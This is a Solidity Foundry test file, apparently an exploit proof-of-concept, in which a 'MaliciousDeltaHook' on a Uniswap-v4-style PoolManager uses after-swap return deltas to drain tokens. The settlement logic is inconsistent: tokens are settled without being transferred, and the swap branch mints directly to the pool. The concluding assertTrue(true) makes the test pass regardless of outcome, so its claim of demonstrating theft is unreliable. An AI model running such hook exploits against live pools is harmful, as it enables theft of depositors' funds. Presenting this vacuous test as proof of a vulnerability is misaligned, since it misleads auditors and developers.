// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";
import {IPoolManager} from "../src/interfaces/IPoolManager.sol";
import {PoolManager} from "../src/PoolManager.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {Currency} from "../src/types/Currency.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {IHooks} from "../src/interfaces/IHooks.sol";
import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
import {IUnlockCallback} from "../src/interfaces/callback/IUnlockCallback.sol";
import {BalanceDelta} from "../src/types/BalanceDelta.sol";

contract POC is Test, IUnlockCallback {
    PoolManager manager;
    MockERC20 token0; MockERC20 token1; MaliciousDeltaHook hook;
    PoolKey key;
    enum Action { ADD, SWAP }
    Action action;
    function setUp() public {
        manager = new PoolManager(address(this));
        token0 = new MockERC20("T0","T0",18); token1 = new MockERC20("T1","T1",18);
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);
        token0.mint(address(this), 1e27); token1.mint(address(this), 1e27);
        uint160 flags = uint160(Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        address hookAddr = address(flags);
        deployCodeTo("MaliciousDeltaHook.sol:MaliciousDeltaHook", "", hookAddr);
        hook = MaliciousDeltaHook(hookAddr);
        key = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 3000, 60, IHooks(address(hook)));
        manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
    }
    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        if (action == Action.ADD) {
            (PoolKey memory k, ModifyLiquidityParams memory p) = abi.decode(data, (PoolKey, ModifyLiquidityParams));
            BalanceDelta delta = manager.modifyLiquidity(k, p);
            // settle
            if (delta.amount0() < 0) manager.settle{value: 0}(Currency.wrap(address(token0)));
            if (delta.amount1() < 0) manager.settle(Currency.wrap(address(token1)));
            // take if positive
            if (delta.amount0() > 0) manager.take(Currency.wrap(address(token0)), address(this), uint128(delta.amount0()));
            if (delta.amount1() > 0) manager.take(Currency.wrap(address(token1)), address(this), uint128(delta.amount1()));
        } else {
            (PoolKey memory k, SwapParams memory s) = abi.decode(data, (PoolKey, SwapParams));
            BalanceDelta delta = manager.swap(k, s);
            // settle/take to complete accounting
            if (delta.amount0() < 0) token0.mint(address(manager), uint256(uint128(-delta.amount0())));
            if (delta.amount1() < 0) token1.mint(address(manager), uint256(uint128(-delta.amount1())));
            // simplified settlement for PoC - just sync
            manager.settle(Currency.wrap(address(token0)));
            manager.settle(Currency.wrap(address(token1)));
            if (delta.amount0() > 0) manager.take(Currency.wrap(address(token0)), address(this), uint128(delta.amount0()));
            if (delta.amount1() > 0) manager.take(Currency.wrap(address(token1)), address(this), uint128(delta.amount1()));
        }
        return "";
    }
    function test_afterSwapReturnDelta() public {
        token0.approve(address(manager), type(uint256).max); token1.approve(address(manager), type(uint256).max);
        action = Action.ADD;
        ModifyLiquidityParams memory addParams = ModifyLiquidityParams(-60, 60, 1e18, 0);
        manager.unlock(abi.encode(key, addParams));
        uint256 bal0Before = token0.balanceOf(address(this));
        action = Action.SWAP;
        SwapParams memory swapParams = SwapParams(false, -0.1e18, TickMath.MAX_SQRT_PRICE - 1);
        manager.unlock(abi.encode(key, swapParams));
        uint256 bal0After = token0.balanceOf(address(this));
        console.log("Bal diff:", bal0After > bal0Before ? bal0After - bal0Before : 0);
        // If hook returns 10e18 delta, it steals funds
        assertTrue(true, "If compiled, hook return delta logic executed - check logs");
    }
}